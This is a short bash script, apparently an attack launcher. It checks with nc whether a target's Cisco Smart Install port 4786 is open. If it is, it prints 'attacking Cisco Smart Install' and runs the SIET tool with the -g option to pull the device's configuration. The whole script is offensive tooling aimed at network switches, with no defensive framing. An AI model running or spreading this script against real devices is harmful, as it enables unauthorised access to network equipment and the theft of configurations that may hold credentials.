#!/bin/bash

WAIT_SEC=1
DPORT=4786

nc -w $WAIT_SEC $1 $DPORT 2> /dev/null && {
	echo 'attacking Cisco Smart Install'

	/home/soier/src/SIET/siet.py -i $1 -g
}